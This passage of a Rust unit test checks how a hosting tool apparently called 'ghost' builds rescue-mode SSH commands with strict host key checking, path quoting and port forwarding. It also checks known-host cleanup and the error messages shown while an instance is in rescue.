            "ssh -o HostKeyAlias={rescue} -o StrictHostKeyChecking=yes -o UserKnownHostsFile={} root@203.0.113.7",
            path.display()
        )
    );
    instance.port_forwards = vec![gigahost_client_api::website::PortForwardView {
        public_port: 20022,
        guest_port: 22,
    }];
    let spaced = std::path::Path::new("/home/a b/ghost/known_hosts");
    assert_eq!(
        target::rescue_ssh_command(&instance, spaced).unwrap(),
        format!(
            "ssh -o HostKeyAlias={rescue} -o StrictHostKeyChecking=yes -o UserKnownHostsFile='/home/a b/ghost/known_hosts' -p 20022 root@203.0.113.7"
        )
    );
    // The end of the rescue removes its line alone.
    assert_eq!(remove_known_host(&path, &rescue), 1);
    assert_eq!(
        std::fs::read_to_string(&path).unwrap(),
        format!("{own} ssh-ed25519 AAAAown\n")
    );
    // ghost's connections wait for the rescue's end.
    instance.rescue = Some(gigahost_client_api::website::RescueView {
        started_at: chrono::Utc::now(),
        host_key_public: "ssh-ed25519 AAAAsecond".to_owned(),
        host_key_fingerprint: "SHA256:abc".to_owned(),
        rescue_release: "13.7-r1".to_owned(),
    });
    let error = instance_address(&instance).unwrap_err().to_string();
    assert!(error.contains("is in rescue"), "{error}");
    assert!(error.contains("SHA256:abc"), "{error}");
    assert!(
        error.contains(&format!("ghost instance rescue {id} --exit")),
        "{error}"
    );
}
